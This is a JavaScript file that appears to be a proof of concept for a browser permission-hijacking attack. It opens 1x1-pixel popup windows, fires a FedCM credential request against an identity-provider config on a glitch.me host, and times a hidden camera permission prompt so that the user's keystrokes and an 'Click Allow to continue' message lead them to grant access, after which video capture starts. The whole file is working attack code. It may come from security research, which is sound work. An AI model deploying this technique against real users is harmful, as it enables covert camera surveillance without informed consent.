var ran = false;
var requestedCreds = false;
var newWin;
var newWin2;
window.addEventListener('click', () => {
  if (ran) {
    newWin.focus();
  }
});
window.addEventListener('keydown', async () => {
  if (ran) {
    newWin.focus();
    return;
  }

  ran = true;
  newWin = window.open('about:blank', 'aoTest', 'width=1,height=1,left=600,top=0');
  newWin.resizeTo(1, 1);
  newWin.eval(`
        setInterval(() => {
            if (!window.opener) { window.close(); }
            navigator.permissions.query({ name: 'camera' }).then((result) => {
                if (result.state == 'granted') {
                    window.close();
                }
            });
        }, 200);
    `);
  newWin.addEventListener('keydown', () => {
    if (!requestedCreds) {
      requestedCreds = true;
      newWin.navigator.credentials.get({
        identity: {
          providers: [{
            configURL: "https://ao-fedcm-idp.glitch.me/test/fedcm.json",
            clientId: "1234",
            nonce: "5678"
          }]
        },
        mediation: "required"
      });
    } else {
      newWin2 = newWin.open('about:blank', 'aoTest2', 'width=1,height=1,left=350,top=290');
      newWin2.resizeTo(1, 1);
      newWin2.eval(`
                setInterval(() => {
                    if (!window.opener) { window.close(); }
                    navigator.permissions.query({ name: 'camera' }).then((result) => {
                        if (result.state == 'granted') {
                            window.close();
                        }
                    });
                }, 200);
            `);
      setTimeout(() => {
        newWin2.navigator.mediaDevices.getUserMedia({
          video: true
        });
        instructions.innerText = 'Click Allow to continue';
      }, 1000);
    }
  });
  setInterval(() => {
    navigator.permissions.query({
      name: 'camera'
    }).then(result => {
      if (result.state == 'granted') {
        instructions.innerText = 'We have the permission (camera)';
        navigator.mediaDevices.getUserMedia({
          video: true
        });
      }
    });
  }, 500);
});